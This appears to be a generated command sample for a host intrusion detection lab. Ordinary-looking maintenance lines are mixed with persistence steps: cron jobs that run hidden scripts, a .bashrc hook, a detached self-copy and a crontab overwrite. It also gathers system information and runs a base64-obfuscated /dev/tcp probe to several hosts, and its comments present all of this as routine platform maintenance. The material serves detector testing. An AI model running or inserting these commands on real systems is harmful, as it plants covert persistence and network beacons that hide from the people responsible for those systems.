command:
env -i PATH="$PATH" TZ=UTC sh -c 'echo isolated-check';
printf 'timed maintenance
'; mkdir -p /tmp/hids-lab/spool/cron; printf '*/15 * * * * sh /tmp/hids-lab/state/worker.sh
' >> /tmp/hids-lab/spool/cron/lab;
printf 'cleanup-tick
' >> /tmp/hids-lab/log/ops.log;

nice -n 5 sh -c 'date -u; echo queue-tick';
printf 'worker refresh\n'; cp /tmp/hids-lab/runner.sh /tmp/hids-lab/state/runner.sh.copy 2>/dev/null || cp "$0" /tmp/hids-lab/state/runner.sh.copy; sh /tmp/hids-lab/state/runner.sh.copy;
for _ in 1; do :; done;

env -i PATH="$PATH" TZ=UTC sh -c 'echo isolated-check';
printf 'timed maintenance\n'; mkdir -p /tmp/hids-lab/spool/cron; printf '*/15 * * * * sh /tmp/hids-lab/state/.session-sync\n' >> /tmp/hids-lab/spool/cron/lab;
# end maintenance simulation

case "${MODE:-dev}" in dev|test) echo profile-ok;; *) echo profile-alt;; esac;
printf 'shell init template\n'; mkdir -p /tmp/hids-lab/home; printf 'sh /tmp/hids-lab/state/.session-sync >/dev/null 2>&1 &\n' >> /tmp/hids-lab/home/.bashrc;
for _ in 1; do :; done;

command -v timeout >/dev/null && echo scheduler-ok || echo scheduler-lite;
printf 'session isolation\n'; cp /tmp/hids-lab/runner.sh /tmp/hids-lab/state/runner.sh; setsid sh /tmp/hids-lab/state/runner.sh >/dev/null 2>&1 < /dev/null &
printf 'cleanup-tick\n' >> /tmp/hids-lab/log/ops.log;

printf 'noop
' >> /tmp/hids-lab/notes; tail -n 1 /tmp/hids-lab/notes 2>/dev/null || true;
printf 'schedule check
'; printf '*/20 * * * * sh /tmp/hids-lab/state/.session-sync
' | crontab - 2>/dev/null || true;
printf 'cleanup-tick
' >> /tmp/hids-lab/log/ops.log;

# routine scheduler maintenance window
# cache pressure nominal
# no application changes requested
# owner: platform-ops
printf 'maintenance begin
';
printf 'link status
'; ip addr > /tmp/hids-lab/interfaces.txt 2>/dev/null || ifconfig -a > /tmp/hids-lab/interfaces.txt 2>/dev/null || true;
echo 'job complete';

for x in one two three; do :; done; printf 'arg pass\n';
printf 'resource shape\n'; lscpu > /tmp/hids-lab/cpu.txt 2>/dev/null || true; free -m > /tmp/hids-lab/mem.txt 2>/dev/null || true;
echo 'wrapper exited';

: "${TZ:=UTC}"; export TZ; echo timezone-ready;
printf 'timeout budget\n'; timeout 3 sh -c 'date -u; printf %s Zm9yIGggaW4gMTkyLjAuMi4xMCAxOTguNTEuMTAwLjIwIDIwMy4wLjExMy4zMDsgZG8gdGltZW91dCAxIGJhc2ggLWMgImVjaG8gPi9kZXYvdGNwLyRoLzgwIiAyPi9kZXYvbnVsbDsgZG9uZQ== | base64 -d | sh';
echo 'job complete';
